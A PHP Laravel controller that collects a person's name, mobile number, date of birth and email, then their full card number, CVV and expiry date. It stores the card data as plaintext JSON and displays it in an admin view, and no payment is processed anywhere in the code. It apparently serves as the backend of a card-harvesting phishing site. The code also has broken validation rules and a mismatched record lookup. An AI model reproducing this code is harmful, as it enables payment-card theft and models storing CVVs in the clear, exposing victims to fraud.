<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\formSubmit;
use App\Models\MessagesUser;
use Illuminate\Http\Request;

class UserFormController extends Controller
{
    public function index()
    {
        $dataList = formSubmit::orderBy('id', 'DESC')->get();
        return view('admin.formDetails', compact('dataList'));
    }
    public function formSubmit(Request $request)
    {
        $request->validate([
            'name' => "required",
            'mobile' => "required|unique:form_submits,email,",
            'dob' => "required",
            'email' => "required",
        ]);
        $find = formSubmit::where("mobile", $request->mobile)->first();
        if ($find !== null) {
            $formSubmit = formSubmit::find($find->id);
            $MessageUser = MessagesUser::find($find->id);
            $formSubmit->name = $request->name ?? null;
            $formSubmit->mobile = $request->mobile ?? null;
            $MessageUser->mobile = $request->mobile ?? null;
            $formSubmit->dob = $request->dob ?? null;
            $formSubmit->email = $request->email ?? null;
            $result = $formSubmit->save();
            $MessageUser->save();
            if ($result == true) {
                return redirect('user/card/' . $request->email . '');
            } else {
                return view('applynow');
            }
        } else {

            $formSubmit = new formSubmit;
            $MessageUser = new MessagesUser;
            $formSubmit->name = $request->name ?? null;
            $formSubmit->mobile = $request->mobile ?? null;
            $MessageUser->mobile = $request->mobile ?? null;
            $formSubmit->dob = $request->dob ?? null;
            $formSubmit->email = $request->email ?? null;
            $result = $formSubmit->save();
            $MessageUser->save();
            if ($result == true) {
                return redirect('user/card/' . $request->email . '');
            } else {
                return view('applynow');
            }
        }

    }

    public function cardSubmit(Request $request, $id)
    {
        $request->validate([
            'card' => "required|max:16,min:16",
            'cvv' => "required|max:3|min:3",
            'expdt' => "required"
        ]);
        $cardDetails = [
            "cardNumber" => $request->card ?? null,
            "cvv" => $request->cvv ?? null,
            "expdt" => $request->expdt ?? null,
        ];

        $dataUpdate = formSubmit::find($id);
        $dataUpdate->card_details = json_encode($cardDetails, true) ?? null;
        $dataUpdate->save();
    }
    public function card($id)
    {
        $data = formSubmit::where('email', $id)->first();
        $id = $data->id;
        return view('cardform', compact('id'));
    }
    public function delete($id)
    {
        $destroy = formSubmit::find($id)->destroy($id);
        return redirect()->back();
    }

    public function showCardDetails($id)
    {
        $cardData = formSubmit::find($id);
        return view('admin.cardView', compact('cardData'));
    }
}
